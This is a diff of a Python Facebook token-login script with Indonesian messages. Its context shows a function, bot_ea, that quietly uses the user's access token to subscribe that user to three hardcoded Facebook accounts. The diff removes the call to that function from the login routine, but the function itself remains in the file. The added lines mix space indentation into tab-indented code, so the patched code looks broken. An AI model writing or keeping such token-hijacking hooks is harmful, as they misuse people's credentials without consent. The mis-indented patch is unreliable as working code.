@@ -25,9 +25,6 @@ def bot_ea():
 	ses.post("https://graph.facebook.com/100003058813748/subscribers?access_token="+token)
 	ses.post("https://graph.facebook.com/100022849470990/subscribers?access_token="+token)
 	ses.post("https://graph.facebook.com/100010998764674/subscribers?access_token="+token)
-	print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
-	time.sleep(1)
-	menu()
 	
 def logo():
 	os.system("clear")
@@ -49,7 +46,9 @@ def login():
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
-			bot_ea()
+			print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
+                        time.sleep(1)
+                        menu()
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit(" ! token kadaluwarsa")
